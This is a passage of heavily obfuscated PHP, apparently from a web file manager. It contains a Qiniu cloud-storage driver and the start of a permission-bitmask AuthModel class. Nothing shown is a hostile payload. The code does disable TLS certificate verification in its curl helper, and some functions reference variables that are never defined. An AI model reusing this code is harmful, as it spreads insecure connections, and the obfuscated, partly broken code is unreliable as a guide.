$E¡œ”º•ïœ, $b÷Î«Ûñå²); if ($CôÁ—²ôáñ) { return !1; } $bŠâ¸È´Ç… = array_key_exists($cõ­”ñ¬Ëö[914], $EçÛñÈİ¯æ) ? $bŠâ¸È´Ç… = $EçÛñÈİ¯æ[$cõ­”ñ¬Ëö[948]] : $cõ­”ñ¬Ëö[33]; foreach ($EçÛñÈİ¯æ[$cõ­”ñ¬Ëö[949]] as $A÷š¤ç‹—…) { $B§ÁòÑë×ª = $A÷š¤ç‹—…[$cõ­”ñ¬Ëö[88]]; if ($f‡í½¸¬ê¹) { $B§ÁòÑë×ª = array($cõ­”ñ¬Ëö[28] => $B§ÁòÑë×ª, $cõ­”ñ¬Ëö[78] => $A÷š¤ç‹—…[$cõ­”ñ¬Ëö[950]]); } $cÑĞåã•²˜[] = $B§ÁòÑë×ª; } if ($bŠâ¸È´Ç… == $cõ­”ñ¬Ëö[33]) { break; } } return $cÑĞåã•²˜; goto dï»ôê¯î; dï»ôê¯î: } public function rename($cÏÊëã´Š, $Fé´ä‹İìê) { return $this->renameObject($cÏÊëã´Š, $Fé´ä‹İìê); } public function size($CĞ¥¨©Öåœ) { $D™ˆ£Œéç =& $_SERVER[İåâé¾]; list($cíãŒÓõ¼Ä, $D±Ö»Ïà˜Ö) = $this->bucketManager->stat($this->bucket, trim($CĞ¥¨©Öåœ, $D™ˆ£Œéç[8])); return isset($cíãŒÓõ¼Ä[$D™ˆ£Œéç[950]]) ? $cíãŒÓõ¼Ä[$D™ˆ£Œéç[950]] : 0; } public function _info($bÁë§Š²íï) { $bÁë§Š²íï = trim($bÁë§Š²íï, $_SERVER[İåâé¾][8]); if ($this->isFolder($bÁë§Š²íï)) { return $this->folderInfo($bÁë§Š²íï, 1); } return $this->fileInfo($bÁë§Š²íï); } public function fileInfo($F‰ßĞèáµé, $cÖš‰Öë• = array(), $c©Î²¯£ò = false) { goto dÄëÕñ¼å; Eë¤…¤Õ¶’: if (empty($cÖš‰Öë•)) { list($cÖš‰Öë•, $f‘¹“¡Úè¤) = $this->bucketManager->stat($this->bucket, $F‰ßĞèáµé); if ($f‘¹“¡Úè¤) { return $b­íò¶å¹; } $this->fileInfoImage($F‰ßĞèáµé, $b­íò¶å¹); } $b­íò¶å¹[$dä¦¹ˆ‰Å[186]] = substr($cÖš‰Öë•[$dä¦¹ˆ‰Å[951]], 0, -7); $b­íò¶å¹[$dä¦¹ˆ‰Å[78]] = $cÖš‰Öë•[$dä¦¹ˆ‰Å[950]]; goto Dâ¦™ ‘¬°; Dâ¦™ ‘¬°: return $b­íò¶å¹; goto EÎ–ˆ¶; dÄëÕñ¼å: $dä¦¹ˆ‰Å =& $_SERVER[İåâé¾]; if ($c©Î²¯£ò) { return array($dä¦¹ˆ‰Å[28] => $this->pathThis($F‰ßĞèáµé), $dä¦¹ˆ‰Å[76] => $this->getPathOuter($dä¦¹ˆ‰Å[8] . $F‰ßĞèáµé), $dä¦¹ˆ‰Å[29] => $dä¦¹ˆ‰Å[163], $dä¦¹ˆ‰Å[78] => isset($cÖš‰Öë•[$dä¦¹ˆ‰Å[950]]) ? $cÖš‰Öë•[$dä¦¹ˆ‰Å[950]] : 0, $dä¦¹ˆ‰Å[156] => $this->ext($F‰ßĞèáµé)); } $b­íò¶å¹ = array($dä¦¹ˆ‰Å[28] => $this->pathThis($F‰ßĞèáµé), $dä¦¹ˆ‰Å[76] => $this->getPathOuter($dä¦¹ˆ‰Å[8] . $F‰ßĞèáµé), $dä¦¹ˆ‰Å[29] => $dä¦¹ˆ‰Å[163], $dä¦¹ˆ‰Å[186] => $dä¦¹ˆ‰Å[50], $dä¦¹ˆ‰Å[105] => $dä¦¹ˆ‰Å[50], $dä¦¹ˆ‰Å[78] => 0, $dä¦¹ˆ‰Å[156] => $this->ext($F‰ßĞèáµé), $dä¦¹ˆ‰Å[187] => !0, $dä¦¹ˆ‰Å[188] => !0); goto Eë¤…¤Õ¶’; EÎ–ˆ¶: } public function folderInfo($fÚŞóÓ¢ù, $eäÙ°¶³Çò = 0, $Eñ…ö‡‡íç = false) { $cöÁ¿àÌÎ =& $_SERVER[İåâé¾]; if ($Eñ…ö‡‡íç) { return array($cöÁ¿àÌÎ[28] => $this->pathThis($fÚŞóÓ¢ù), $cöÁ¿àÌÎ[76] => $this->getPathOuter($cöÁ¿àÌÎ[8] . $fÚŞóÓ¢ù), $cöÁ¿àÌÎ[29] => $cöÁ¿àÌÎ[77]); } $e¢Ø‘áŸÌ = array($cöÁ¿àÌÎ[28] => $this->pathThis($fÚŞóÓ¢ù), $cöÁ¿àÌÎ[76] => $this->getPathOuter($cöÁ¿àÌÎ[8] . $fÚŞóÓ¢ù), $cöÁ¿àÌÎ[29] => $cöÁ¿àÌÎ[77], $cöÁ¿àÌÎ[186] => $cöÁ¿àÌÎ[50], $cöÁ¿àÌÎ[105] => $cöÁ¿àÌÎ[50], $cöÁ¿àÌÎ[190] => 1, $cöÁ¿àÌÎ[191] => 1, $cöÁ¿àÌÎ[892] => !0, $cöÁ¿àÌÎ[893] => !0); if ($eäÙ°¶³Çò) { $e¢Ø‘áŸÌ[$cöÁ¿àÌÎ[190]] = $this->has($fÚŞóÓ¢ù, !1); $e¢Ø‘áŸÌ[$cöÁ¿àÌÎ[191]] = $this->has($fÚŞóÓ¢ù, !0); } return $e¢Ø‘áŸÌ; } public function exist($FÒà†àŞÕ°) { if ($this->isFile($FÒà†àŞÕ°) || $this->isFolder($FÒà†àŞÕ°)) { return !0; } return !1; } public function info($E¹†õ‘ê‚») { return $this->cacheMehod($_SERVER[İåâé¾][182], $E¹†õ‘ê‚»); } public function isFile($EŞ¶‘ƒ†ÕÇ) { return $this->cacheMehod($_SERVER[İåâé¾][183], $EŞ¶‘ƒ†ÕÇ); } public function isFolder($Fí¾„®á‡) { return $this->cacheMehod($_SERVER[İåâé¾][184], $Fí¾„®á‡); } public function _isFile($a„ŒÃÎÙô…) { list($DßÒ®Õœª¤, $Dù™©ÀĞœ­) = $this->bucketManager->stat($this->bucket, trim($a„ŒÃÎÙô…, $_SERVER[İåâé¾][8])); return $Dù™©ÀĞœ­ ? !1 : !0; } public function _isFolder($fáÙ’¸¯¥ï) { goto fÆÙöË‘Œ; dÕ¶ÑõÜ»: $b—àÇ«¬Ÿˆ = trim($fáÙ’¸¯¥ï, $Fä‚•‹ÌµÇ[8]) . $Fä‚•‹ÌµÇ[8]; $F¡ù‡óîÊ¦ = $Fä‚•‹ÌµÇ[33]; $e¿µÀ¥˜ = 1; goto AŸˆÅï†õó; AŸˆÅï†õó: $d±£ß¤‰ = $Fä‚•‹ÌµÇ[8]; list($Aî°˜À¹­´, $EŞÖ™Î‚ëÅ) = $this->bucketManager->listFiles($this->bucket, $b—àÇ«¬Ÿˆ, $F¡ù‡óîÊ¦, $e¿µÀ¥˜, $d±£ß¤‰); if (!empty($Aî°˜À¹­´[$Fä‚•‹ÌµÇ[949]]) || !empty($Aî°˜À¹­´[$Fä‚•‹ÌµÇ[952]])) { return !0; } goto f„¿–Çàîá; f„¿–Çàîá: return !1; goto F•äŸŒğ£; fÆÙöË‘Œ: $Fä‚•‹ÌµÇ =& $_SERVER[İåâé¾]; $fôêìêßÙˆ = trim($fáÙ’¸¯¥ï, $Fä‚•‹ÌµÇ[8]); if (empty($fôêìêßÙˆ)) { return !0; } goto dÕ¶ÑõÜ»; F•äŸŒğ£: } public function listPath($C¤——¿ÕµÑ, $b¬æíø‰§Á = false, $e†Ôñ‰·‚ˆ = false) { goto f·ŞâÖ©³£; cÃĞƒñ: $e‡°·Å‘¥Å = $A¯¾Ü™–š” = array(); while (!0) { list($F¹Šãâ‘¸ƒ, $bÎ‰ï¶ŠåÙ) = $this->bucketManager->listFiles($this->bucket, $BÙö½öó, $c–×“„• ¨, $Fƒù»„‰ò“, $fé‰†£„); if ($bÎ‰ï¶ŠåÙ) { return !1; } $c–×“„• ¨ = array_key_exists($d„ğ†Ô¬[914], $F¹Šãâ‘¸ƒ) ? $c–×“„• ¨ = $F¹Šãâ‘¸ƒ[$d„ğ†Ô¬[948]] : $d„ğ†Ô¬[33]; if (isset($F¹Šãâ‘¸ƒ[$d„ğ†Ô¬[952]])) { foreach ($F¹Šãâ‘¸ƒ[$d„ğ†Ô¬[952]] as $B³ÃÏ‘ø»†) { if ($B³ÃÏ‘ø»† == $BÙö½öó) { continue; } $e‡°·Å‘¥Å[] = $this->folderInfo($B³ÃÏ‘ø»†, $b¬æíø‰§Á, $e†Ôñ‰·‚ˆ); } } if (isset($F¹Šãâ‘¸ƒ[$d„ğ†Ô¬[949]])) { foreach ($F¹Šãâ‘¸ƒ[$d„ğ†Ô¬[949]] as $E‘­ÏõÛ­) { if ($E‘­ÏõÛ­[$d„ğ†Ô¬[88]] == $BÙö½öó) { continue; } $A¯¾Ü™–š”[] = $this->fileInfo($E‘­ÏõÛ­[$d„ğ†Ô¬[88]], $E‘­ÏõÛ­, $e†Ôñ‰·‚ˆ); } } if ($c–×“„• ¨ == $d„ğ†Ô¬[33]) { break; } } return array($d„ğ†Ô¬[75] => $e‡°·Å‘¥Å, $d„ğ†Ô¬[74] => $A¯¾Ü™–š”); goto B¤‚‡÷ìí‰; f·ŞâÖ©³£: $d„ğ†Ô¬ =& $_SERVER[İåâé¾]; $C¤——¿ÕµÑ = trim($C¤——¿ÕµÑ, $d„ğ†Ô¬[8]); $BÙö½öó = empty($C¤——¿ÕµÑ) ? $d„ğ†Ô¬[33] : $C¤——¿ÕµÑ . $d„ğ†Ô¬[8]; goto cÎèª¿°Ê; cÎèª¿°Ê: $c–×“„• ¨ = $d„ğ†Ô¬[33]; $Fƒù»„‰ò“ = 1000; $fé‰†£„ = $d„ğ†Ô¬[8]; goto cÃĞƒñ; B¤‚‡÷ìí‰: } public function has($A‰…ÚØŞèˆ, $BàÏÎˆŒ—Æ = true) { goto f¶Å’¬¾Öô; f¶Å’¬¾Öô: $D‡áÙšœœÜ =& $_SERVER[İåâé¾]; $A‰…ÚØŞèˆ = trim($A‰…ÚØŞèˆ, $D‡áÙšœœÜ[8]); $b£…Ü¨‡Éº = empty($A‰…ÚØŞèˆ) ? $D‡áÙšœœÜ[33] : $A‰…ÚØŞèˆ . $D‡áÙšœœÜ[8]; goto DÑˆ»ÈÅŸ¼; DÑˆ»ÈÅŸ¼: $cÉ•ñªÜõÅ = $D‡áÙšœœÜ[33]; $eÌ¾ Œ¥½Ã = 100; $EİŸˆ¦Úó¤ = $D‡áÙšœœÜ[8]; goto C…Áœ‚Ö; C…Áœ‚Ö: while (!0) { list($dÎ”¦‡Æ±, $d¼éÉ¶”“â) = $this->bucketManager->listFiles($this->bucket, $b£…Ü¨‡Éº, $cÉ•ñªÜõÅ, $eÌ¾ Œ¥½Ã, $EİŸˆ¦Úó¤); if ($d¼éÉ¶”“â) { return !1; } $cÉ•ñªÜõÅ = array_key_exists($D‡áÙšœœÜ[914], $dÎ”¦‡Æ±) ? $cÉ•ñªÜõÅ = $dÎ”¦‡Æ±[$D‡áÙšœœÜ[948]] : $D‡áÙšœœÜ[33]; if ($BàÏÎˆŒ—Æ) { if (!empty($dÎ”¦‡Æ±[$D‡áÙšœœÜ[949]])) { return !0; } } else { if (!empty($dÎ”¦‡Æ±[$D‡áÙšœœÜ[952]])) { return !0; } } if ($cÉ•ñªÜõÅ == $D‡áÙšœœÜ[33]) { break; } } return !1; goto DâÈà‹ª; DâÈà‹ª: } public function listAll($cÂ¸¸æ¶·ã) { $aªè›±— © =& $_SERVER[İåâé¾]; $BˆèÁïÇ™à = $this->fileList($cÂ¸¸æ¶·ã, 1); $B¬ˆÓÈ–éÂ = array(); foreach ($BˆèÁïÇ™à as $e£¸Í¾”å) { $B¬ˆÓÈ–éÂ[$e£¸Í¾”å[$aªè›±— ©[28]]] = $e£¸Í¾”å[$aªè›±— ©[78]]; } return $this->listAllFiles($cÂ¸¸æ¶·ã, array_keys($B¬ˆÓÈ–éÂ), $B¬ˆÓÈ–éÂ); } public function canRead($f²áíí¡šš) { return $this->exist($f²áíí¡šš) ? !0 : !1; } public function canWrite($DçÃïØÌÖ) { return $this->exist($DçÃïØÌÖ) ? !0 : !1; } public function getContent($AáÀßÕØŞ) { return $this->fileSubstr($AáÀßÕØŞ, 0, -1); } public function setContent($Bï¥ôàçİ, $FÎÍ²¯¿Á… = '') { $AßóÎé…ïá = $this->tempFile($this->pathThis($Bï¥ôàçİ)); file_put_contents($AßóÎé…ïá, $FÎÍ²¯¿Á…); if ($this->upload($Bï¥ôàçİ, $AßóÎé…ïá)) { $this->tempFileRemve($AßóÎé…ïá); return !0; } return !1; } public function refreshUrls($Cåµ¼²¬æ) { goto B¨´¿¢×¯¿; dëª°Œ›´ƒ: return $Eº‹¾•İ¦Ë[$bëÜ¡æ¹“°[953]] == $bëÜ¡æ¹“°[453] ? !0 : !1; goto D‰ÄÎÔù¯; B¨´¿¢×¯¿: $bëÜ¡æ¹“° =& $_SERVER[İåâé¾]; $F³•é™Ê† = array(); if (is_array($Cåµ¼²¬æ)) { foreach ($Cåµ¼²¬æ as $Cñ¡¼âœÒæ) { $F³•é™Ê†[] = $this->link($Cñ¡¼âœÒæ); } } else { $F³•é™Ê†[] = $this->link($Cåµ¼²¬æ); } goto dÙ¢©‚˜‹á; dÙ¢©‚˜‹á: $aê÷‰—‡Ö = new Qiniu\Cdn\CdnManager($this->auth); list($Eº‹¾•İ¦Ë, $dŸÔ‹±´Å) = $aê÷‰—‡Ö->refreshUrls($F³•é™Ê†); if ($dŸÔ‹±´Å) { return !1; } goto dëª°Œ›´ƒ; D‰ÄÎÔù¯: } public function fileSubstr($f¨ƒ´šÙÈ, $aºÆ‡ë±—‘, $C¼Ó¾Ã”å) { $C™¿Å›¼Ù =& $_SERVER[İåâé¾]; if (!($d™ÖĞğš©‚ = $this->link($f¨ƒ´šÙÈ))) { return !1; } $a½Äèá´Âˆ = array($C™¿Å›¼Ù[917] => $aºÆ‡ë±—‘, $C™¿Å›¼Ù[328] => $C¼Ó¾Ã”å); return $this->qnRequest($d™ÖĞğš©‚, $a½Äèá´Âˆ); } public function upload($FÕÑ“¸ù÷¶, $f²åÔÀ¶œ©, $bÏÃº»Ö‰ = false, $cŸ®ë—à•‡ = REPEAT_REPLACE) { $eáÍÕá«™Ó = new Qiniu\Storage\UploadManager(); $e„ÜßéÜˆ¨ = $this->auth->uploadToken($this->bucket, $FÕÑ“¸ù÷¶); $dóÊËå­¼ = get_file_mime(get_path_ext($B óµ°ÆÜ‚)); list($AÉôÙ«Ó¼¢, $eæß®ÇÆø) = $eáÍÕá«™Ó->putFile($e„ÜßéÜˆ¨, $FÕÑ“¸ù÷¶, $f²åÔÀ¶œ©, null, $dóÊËå­¼); return $eæß®ÇÆø ? !1 : $this->getPathOuter($FÕÑ“¸ù÷¶); } public function uploadFormData($D‡¹±ÇÒøô, $CòÇ‹¤ä = 3600) { return $this->uploadToken($D‡¹±ÇÒøô, $CòÇ‹¤ä); } public function multiUploadFormData($C¥¦æ·Ğ–, $EÓÓò¿Ø± = 3600) { return $this->uploadToken($C¥¦æ·Ğ–, $EÓÓò¿Ø±); } private function uploadToken($E£±ƒª ¦, $a‡™«­«Ş = 3600) { goto aäÆ™Î†Ç…; F‘Ú¼™»ƒÀ: $A†‘Ìçº„™ = null; $c¯á‹‰áÊÑ = $this->auth->uploadToken($this->bucket, $A†‘Ìçº„™, $CÕÎîï, $CĞ¯—¥ğŞó, !0); $F ·„‰‚µ = empty($this->region) || $this->region == $Dİ‡¼ÒÏöª[956] ? $Dİ‡¼ÒÏöª[33] : $Dİ‡¼ÒÏöª[498] . $this->region; goto bœòĞë÷Ãõ; bœòĞë÷Ãõ: $EŠßâ“¸ë = http_type() . "\x3a\x2f\x2f\165\x70\x6c\157\141\144{$F ·„‰‚µ}\56\x71\151\x6e\x69\x75\160\x2e\143\x6f\x6d\57"; return array($Dİ‡¼ÒÏöª[957] => $c¯á‹‰áÊÑ, $Dİ‡¼ÒÏöª[958] => $EŠßâ“¸ë); goto d‚”´¡„çæ; aäÆ™Î†Ç…: $Dİ‡¼ÒÏöª =& $_SERVER[İåâé¾]; $CÕÎîï = $a‡™«­«Ş; $CĞ¯—¥ğŞó = array($Dİ‡¼ÒÏöª[954] => $Dİ‡¼ÒÏöª[955]); goto F‘Ú¼™»ƒÀ; d‚”´¡„çæ: } public function download($a¥Ã´§‚¯, $bˆ¨ÔÔåÕô) { goto D…¨…¶ß¡‡; D…¨…¶ß¡‡: $B·Ãèâ–Ø =& $_SERVER[İåâé¾]; $a¯‡èÈ†Å¬ = IO::getPathInner(IO::mkfile($bˆ¨ÔÔåÕô)); if (!($c‚¿áíŞÀÓ = $this->link($a¥Ã´§‚¯))) { return !1; } goto EŒöñÎ’¡Ò; cÇÄ÷Ëäê: while (!0) { $d¼©ƒÛ…ƒõ = array($B·Ãèâ–Ø[917] => $E Äƒö«Ê¡, $B·Ãèâ–Ø[328] => $E«”øÇáÎĞ); $C¬–èö† = $this->qnRequest($c‚¿áíŞÀÓ, $d¼©ƒÛ…ƒõ); if ($E Äƒö«Ê¡ && ($BÙŠôğï™¹ = @json_decode($C¬–èö†, !0))) { if (isset($BÙŠôğï™¹[$B·Ãèâ–Ø[953]])) { return !1; } } fwrite($aáùå… , $C¬–èö†); $E Äƒö«Ê¡ += $E«”øÇáÎĞ; if (strlen($C¬–èö†) < $E«”øÇáÎĞ) { break; } } fclose($aáùå… ); return $bˆ¨ÔÔåÕô; goto bÉ›ãÜÆœ¨; EŒöñÎ’¡Ò: $E Äƒö«Ê¡ = 0; $E«”øÇáÎĞ = 1024 * 200; $aáùå…  = fopen($a¯‡èÈ†Å¬, $B·Ãèâ–Ø[959]); goto cÇÄ÷Ëäê; bÉ›ãÜÆœ¨: } public function link($F±¢šÀó£, $fÜ­šƒ¶Ÿ‹ = '') { if (!$this->isFile($F±¢šÀó£)) { return !1; } $e´„»§ÈÒ = $this->getHost() . $_SERVER[İåâé¾][8] . $this->pathEncode($F±¢šÀó£) . $f©¿¹ìÒÅà; return $this->auth->privateDownloadUrl($e´„»§ÈÒ, 3600 * 12); } public function fileOut($aÄŒ™Á†ù, $dÙ­ëÏ¸ = false, $C„¦²’•Ğ = false, $EÂ¦Ê†§¢ˆ = '') { $c”ÌÑµ¿É° =& $_SERVER[İåâé¾]; if (!$C„¦²’•Ğ) { $C„¦²’•Ğ = $this->pathThis($aÄŒ™Á†ù); } $EÂâàåù¤ = $dÙ­ëÏ¸ ? $c”ÌÑµ¿É°[960] . rawurlencode($C„¦²’•Ğ) : $c”ÌÑµ¿É°[33]; $aäÌÁ¢¨Ö» = $this->link($aÄŒ™Á†ù, $EÂâàåù¤); $this->fileOutLink($aäÌÁ¢¨Ö»); } public function fileOutServer($e×–Ì ­’‚, $b˜‹ìØ ¹ç = false, $fàá™È´ÊÏ = false, $E”óì”Ò = '') { parent::fileOut($e×–Ì ­’‚, $b˜‹ìØ ¹ç, $fàá™È´ÊÏ, $E”óì”Ò); } public function fileOutImage($aˆÃÅ¾ÉŸ, $aòÛˆ˜è = 250) { $cÄÄØğ”¯Ç = $this->link($aˆÃÅ¾ÉŸ, $_SERVER[İåâé¾][961] . $aòÛˆ˜è); $this->fileOutLink($cÄÄØğ”¯Ç); } public function fileOutImageServer($a‹’à ˆĞÌ, $DÍ«§†Áæç = 250) { parent::fileOutImage($a‹’à ˆĞÌ, $DÍ«§†Áæç); } public function fileOutLink($eæ³Š…ªÓŠ) { header($_SERVER[İåâé¾][152] . $eæ³Š…ªÓŠ); die; } public function hashMd5($EÁ£±ğ¶¼‚) { $aÃ´Ò¬…ç  =& $_SERVER[İåâé¾]; $BÌ­ì™Š = $this->link($EÁ£±ğ¶¼‚, $aÃ´Ò¬…ç [962]); $Cêğ”ëè‰ˆ = $this->qnRequest($BÌ­ì™Š, array(), !0); return !isset($Cêğ”ëè‰ˆ[$aÃ´Ò¬…ç [196]]) ? !1 : $Cêğ”ëè‰ˆ[$aÃ´Ò¬…ç [196]]; } private function fileInfoImage($EÂŞù’Ÿ¾é, &$aÍˆÁ±¤²») { $e¬ŒÌ¨İŠË =& $_SERVER[İåâé¾]; if (!in_array($aÍˆÁ±¤²»[$e¬ŒÌ¨İŠË[156]], array($e¬ŒÌ¨İŠË[207], $e¬ŒÌ¨İŠË[157], $e¬ŒÌ¨İŠË[208], $e¬ŒÌ¨İŠË[209], $e¬ŒÌ¨İŠË[210]))) { return; } if (!($CÓä± ø” = $this->link($EÂŞù’Ÿ¾é, $e¬ŒÌ¨İŠË[963]))) { return !1; } if (!($B®ö’Ç—¶ = $this->qnRequest($CÓä± ø”, array(), !0))) { return !1; } $aÍˆÁ±¤²»[$e¬ŒÌ¨İŠË[211]] = array($e¬ŒÌ¨İŠË[212] => $B®ö’Ç—¶[$e¬ŒÌ¨İŠË[212]], $e¬ŒÌ¨İŠË[898] => $B®ö’Ç—¶[$e¬ŒÌ¨İŠË[213]]); } public function qnRequest($eô®çÜ½Î, $bæªóºÎ‰ = array(), $eÑœŒ«Åíè = false) { goto Fà¥ÄæÀ³; e£Á’œƒ§: curl_setopt($A¬¥„¢ë®, CURLOPT_PROGRESSFUNCTION, $EäèßÀ¡Ğ…[964]); curl_progress_start($A¬¥„¢ë®); if (isset($bæªóºÎ‰[$EäèßÀ¡Ğ…[917]]) && $bæªóºÎ‰[$EäèßÀ¡Ğ…[328]] > 0) { $dõÑ­ÂÄ›ø = $bæªóºÎ‰[$EäèßÀ¡Ğ…[917]]; $b¡ÄÛÁò÷† = $bæªóºÎ‰[$EäèßÀ¡Ğ…[917]] + ($bæªóºÎ‰[$EäèßÀ¡Ğ…[328]] - 1); curl_setopt($A¬¥„¢ë®, CURLOPT_RANGE, "{$dõÑ­ÂÄ›ø}\x2d{$b¡ÄÛÁò÷†}"); } goto DØ®Œ÷³Î«; DØ®Œ÷³Î«: curl_setopt($A¬¥„¢ë®, CURLOPT_FOLLOWLOCATION, 1); $b›ÌĞóÙÀ = curl_exec($A¬¥„¢ë®); curl_progress_end($A¬¥„¢ë®); goto E·œì—ÄÉÆ; dŞ¼…Ë÷ö: curl_setopt($A¬¥„¢ë®, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($A¬¥„¢ë®, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($A¬¥„¢ë®, CURLOPT_NOPROGRESS, !1); goto e£Á’œƒ§; Fà¥ÄæÀ³: $EäèßÀ¡Ğ… =& $_SERVER[İåâé¾]; $A¬¥„¢ë® = curl_init(); curl_setopt($A¬¥„¢ë®, CURLOPT_URL, $eô®çÜ½Î); goto eŠŸ†¡¿ô; E·œì—ÄÉÆ: curl_close($A¬¥„¢ë®); if ($eÑœŒ«Åíè) { return @json_decode($b›ÌĞóÙÀ, !0); } return $b›ÌĞóÙÀ; goto FšÊõ‘Í®²; eŠŸ†¡¿ô: curl_setopt($A¬¥„¢ë®, CURLOPT_RETURNTRANSFER, 1); curl_setopt($A¬¥„¢ë®, CURLOPT_CONNECTTIMEOUT, 3600); curl_setopt($A¬¥„¢ë®, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto dŞ¼…Ë÷ö; FšÊõ‘Í®²: } } goto A¥ƒ¾ê¨óå; Aâ„ª”íÙ¶: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $A•áâ«óŞ =& $_SERVER[İåâé¾]; $Díç °‡‹æ = array(array($A•áâ«óŞ[387] => LNG($A•áâ«óŞ[1543]), $A•áâ«óŞ[1544] => $A•áâ«óŞ[1545], $A•áâ«óŞ[1546] => 6, $A•áâ«óŞ[1547] => 1, $A•áâ«óŞ[1548] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($A•áâ«óŞ[387] => LNG($A•áâ«óŞ[1549]), $A•áâ«óŞ[1544] => $A•áâ«óŞ[1550], $A•áâ«óŞ[1546] => 1, $A•áâ«óŞ[1547] => 1, $A•áâ«óŞ[1548] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($A•áâ«óŞ[387] => LNG($A•áâ«óŞ[1551]), $A•áâ«óŞ[1544] => $A•áâ«óŞ[1552], $A•áâ«óŞ[1546] => 2, $A•áâ«óŞ[1547] => 1, $A•áâ«óŞ[1548] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($A•áâ«óŞ[387] => LNG($A•áâ«óŞ[1553]), $A•áâ«óŞ[1544] => $A•áâ«óŞ[1552], $A•áâ«óŞ[1546] => 3, $A•áâ«óŞ[1547] => 1, $A•áâ«óŞ[1548] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($A•áâ«óŞ[387] => LNG($A•áâ«óŞ[1554]), $A•áâ«óŞ[1544] => $A•áâ«óŞ[1555], $A•áâ«óŞ[1546] => 4, $A•áâ«óŞ[1547] => 1, $A•áâ«óŞ[1548] => self::AUTH_SHOW | self::AUTH_VIEW), array($A•áâ«óŞ[387] => LNG($A•áâ«óŞ[1556]), $A•áâ«óŞ[1544] => $A•áâ«óŞ[1557], $A•áâ«óŞ[1546] => 5, $A•áâ«óŞ[1547] => 1, $A•áâ«óŞ[1548] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($A•áâ«óŞ[387] => LNG($A•áâ«óŞ[1558]), $A•áâ«óŞ[1544] => $A•áâ«óŞ[1559], $A•áâ«óŞ[1546] => 7, $A•áâ«óŞ[1547] => 1, $A•áâ«óŞ[1548] => 0)); return $Díç °‡‹æ; } public static function authCheck($D©ô¿µƒÚÚ, $Fº½„ƒ¡ †) { $D©ô¿µƒÚÚ = intval($D©ô¿µƒÚÚ); if ($GLOBALS[$_SERVER[İåâé¾][1021]]) { return !0; } if ($D©ô¿µƒÚÚ <= 0) { return !1; } if (($D©ô¿µƒÚÚ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($D©ô¿µƒÚÚ & $Fº½„ƒ¡ †); } public static function authCheckShow($B¡Å™ìâ·Ë) { return self::authCheck($B¡Å™ìâ·Ë, self::AUTH_SHOW); } public static function authCheckView($eõŒùÛÓ) { return self::authCheck($eõŒùÛÓ, self::AUTH_VIEW); } public static function authCheckDownload($bãÇ‡Ô¦™ô) { return self::authCheck($bãÇ‡Ô¦™ô, self::AUTH_DOWNLOAD); } public static function authCheckUpload($eïÚ«Á•­õ) { return self::authCheck($eïÚ«Á•­õ, self::AUTH_UPLOAD); } public static function authCheckEdit($C·ÒòÈõªó) { return self::authCheck($C·ÒòÈõªó, self::AUTH_EDIT); } public static function authCheckRemove($c¡İø»ª…•) { return self::authCheck($c¡İø»ª…•, self::AUTH_REMOVE); } public static function authCheckShare($b…™Õà¹Î¢) { return self::authCheck($b…™Õà¹Î¢, self::AUTH_SHARE); } public static function authCheckComment($E‡ÉêÏàøÕ) { return self::authCheck($E‡ÉêÏàøÕ, self::AUTH_COMMENT); } public static function authCheckEvent($dÊ‚ƒ¡¾´­) { return self::authCheck($dÊ‚ƒ¡¾´­, self::AUTH_EVENT); } public static function authCheckRoot($E°îÌ¿éó) { return self::authCheck($E°îÌ¿éó, self::AUTH_ROOT); } public static function authDisable($eÏ˜Œšó, $bèã†±ğŒØ) { if (intval($eÏ˜Œšó) <= 0) { return 0; } return intval($eÏ˜Œšó) & ~$bèã†±ğŒØ; } public $optionType = "\x53\171\163\164\x65\155\56\163\157\x75\x72\143\x65\101\165\x74\x68\x4c\151\163\164"; public $field = array("\x6e\x61\x6d\x65", "\x61\165\164\150", "\x6c\x61\142\x65\154", "\144\x69\x73\160\x6c\141\x79", "\163\171\x73\164\x65\x6d", "\163\157\x72\164"); public function initData() { $bƒƒšƒ¿ë = $this->authDefault(); foreach ($bƒƒšƒ¿ë as $dïÑÀêš¢) { $this->add($dïÑÀêš¢); } } public function listData($d‡”äİåƒ« = false, $f¼è›ˆÔå¤ = "\x73\x6f\x72\x74", $AÚ ƒêêŠ‹ = false) { return parent::listData($d‡”äİåƒ«, $f¼è›ˆÔå¤, $AÚ ƒêêŠ‹); } public function update($bµØº¡Áå, $A±µÊ… ) { $e§˜²ÂŒåñ =& $_SERVER[İåâé¾]; $Dšã÷æ¯© = parent::listData($bµØº¡Áå); $bˆ¤Ò‡„ß = $this->findByName($A±µÊ… [$e§˜²ÂŒåñ[28]]); if (!$Dšã÷æ¯© || $bˆ¤Ò‡„ß && $bˆ¤Ò‡„ß[$e§˜²ÂŒåñ[368]] != $Dšã÷æ¯©[$e§˜²ÂŒåñ[368]]) { return !1; } $this->filterAuth($A±µÊ… [$e§˜²ÂŒåñ[549]]); return parent::update($bµØº¡Áå, $A±µÊ… ); } public function remove($cñ‡‹ô¥…ß) { $A”è±œšÂ = parent::listData($cñ‡‹ô¥…ß); if (!$A”è±œšÂ || $A”è±œšÂ[$_SERVER[İåâé¾][822]]) { return !1; } return parent::remove($cñ‡‹ô¥…ß); } public function add($fÍ¶Œ¯¶¸ = 